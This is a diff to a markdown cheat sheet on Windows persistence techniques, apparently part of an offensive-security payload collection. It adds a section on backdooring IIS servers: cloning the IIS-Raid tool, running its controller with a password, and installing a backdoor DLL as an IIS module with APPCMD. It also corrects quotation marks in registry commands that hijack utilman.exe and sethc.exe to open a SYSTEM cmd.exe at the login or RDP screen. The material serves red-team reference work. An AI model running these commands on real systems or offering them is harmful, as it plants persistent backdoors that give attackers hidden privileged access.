@@ -9,6 +9,9 @@
     * [Registry](#registry)
     * [Startup](#startup)
     * [Scheduled Task](#scheduled-task)
+* [Serviceland](#serviceland)
+    * [IIS](#iis)
+    * [Windows Service](#windows-service)
 * [Elevated](#elevated)
     * [HKLM](#hklm)
     * [Services](#services)
@@ -101,7 +104,19 @@ SharPersist -t schtask -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -n "Som
 SharPersist -t schtask -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -n "Some Task" -m add -o hourly
 ```
 
-## Windows Service
+## Serviceland
+
+### IIS
+
+IIS Raid – Backdooring IIS Using Native Modules
+
+```powershell
+$ git clone https://github.com/0x09AL/IIS-Raid
+$ python iis_controller.py --url http://192.168.1.11/ --password SIMPLEPASS
+C:\Windows\system32\inetsrv\APPCMD.EXE install module /name:Module Name /image:"%windir%\System32\inetsrv\IIS-Backdoor.dll" /add:true
+```
+
+### Windows Service
 
 Using SharPersist
 
@@ -148,7 +163,7 @@ PS C:\> Register-ScheduledTask Backdoor -InputObject $D
 At the login screen, press Windows Key+U, and you get a cmd.exe window as SYSTEM.
 
 ```powershell
-REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe" /t REG_SZ /v Debugger /d “C:\windows\system32\cmd.exe” /f
+REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe" /t REG_SZ /v Debugger /d "C:\windows\system32\cmd.exe" /f
 ```
 
 #### sethc.exe
@@ -156,7 +171,7 @@ REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution 
 Hit F5 a bunch of times when you are at the RDP login screen.
 
 ```powershell
-REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /t REG_SZ /v Debugger /d “C:\windows\system32\cmd.exe” /f
+REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /t REG_SZ /v Debugger /d "C:\windows\system32\cmd.exe" /f
 ```
 
 
@@ -165,3 +180,4 @@ REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution 
 * [A view of persistence - Rastamouse](https://rastamouse.me/2018/03/a-view-of-persistence/)
 * [Windows Persistence Commands - Pwn Wiki](http://pwnwiki.io/#!persistence/windows/index.md)
 * [SharPersist Windows Persistence Toolkit in C - Brett Hawkins](http://www.youtube.com/watch?v=K7o9RSVyazo)
+* [](https://www.mdsec.co.uk/2020/02/iis-raid-backdooring-iis-using-native-modules/)
